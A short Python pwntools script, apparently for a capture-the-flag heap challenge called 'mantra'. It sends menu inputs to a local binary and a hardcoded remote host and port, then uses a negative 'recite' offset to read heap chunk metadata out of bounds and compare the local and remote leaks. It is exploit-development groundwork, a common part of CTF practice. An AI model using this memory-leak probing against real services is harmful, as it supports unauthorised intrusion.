#!/usr/bin/env python3
"""
Fixed remote vs local comparison - respects primitive constraints
"""
from pwn import *
import time

context.log_level = 'info'

REMOTE_HOST = '154.57.164.75'
REMOTE_PORT = 30444
LOCAL_PATH = ['./glibc/ld-2.34.so', './mantra']

def test_offset_local(offset):
    """Test a specific offset locally"""
    io = process(LOCAL_PATH)
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'string: ', b'100')
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'tie? ', b'1')
    io.sendlineafter(b'glyphs): ', b'TESTTEST')
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'recite? ', str(offset).encode())
    io.recvuntil(b'speaks: [')
    data = io.recvuntil(b']', drop=True)
    io.close()
    return data

def test_offset_remote(offset):
    """Test a specific offset remotely"""
    io = remote(REMOTE_HOST, REMOTE_PORT, timeout=10)
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'string: ', b'100')
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'tie? ', b'1')
    io.sendlineafter(b'glyphs): ', b'TESTTEST')
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'recite? ', str(offset).encode())
    io.recvuntil(b'speaks: [')
    data = io.recvuntil(b']', drop=True)
    io.close()
    return data

def compare_offsets():
    """Compare specific offsets"""
    print("\n" + "="*60)
    print("COMPARING OFFSET -1 (chunk metadata)")
    print("="*60)

    local_data = test_offset_local(-1)
    remote_data = test_offset_remote(-1)

    if local_data == remote_data:
        print(f"✅ MATCH: {local_data.hex()}")
    else:
        print(f"❌ DIFFERENCE:")
        print(f"   Local:  {local_data.hex()}")
        print(f"   Remote: {remote_data.hex()}")

def test_allocation_sizes():
    """Test different allocation sizes on both local and remote"""
    sizes = [10, 50, 100, 200, 500]

    print("\n" + "="*60)
    print("TESTING ALLOCATION SIZES")
    print("="*60)

    for size in sizes:
        # Local
        io = process(LOCAL_PATH)
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'string: ', str(size).encode())
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'tie? ', b'1')
        io.sendlineafter(b'glyphs): ', b'TESTTEST')
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'-1')
        io.recvuntil(b'speaks: [')
        local_chunk = io.recvuntil(b']', drop=True)
        io.close()

        # Remote
        io = remote(REMOTE_HOST, REMOTE_PORT, timeout=10)
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'string: ', str(size).encode())
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'tie? ', b'1')
        io.sendlineafter(b'glyphs): ', b'TESTTEST')
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'-1')
        io.recvuntil(b'speaks: [')
        remote_chunk = io.recvuntil(b']', drop=True)
        io.close()

        if local_chunk == remote_chunk:
            print(f"✅ Size {size:3d}: 0x{int.from_bytes(local_chunk, 'little'):04x} (match)")
        else:
            print(f"❌ Size {size:3d}:")
            print(f"   Local:  0x{int.from_bytes(local_chunk, 'little'):04x}")
            print(f"   Remote: 0x{int.from_bytes(remote_chunk, 'little'):04x}")

def main():
    print("\n" + "="*60)
    print("MANTRA - REMOTE vs LOCAL COMPARISON")
    print("="*60)

    compare_offsets()

    test_allocation_sizes()

    print("\n" + "="*60)
    print("Comparison complete!")
    print("="*60)

if __name__ == '__main__':
    main()
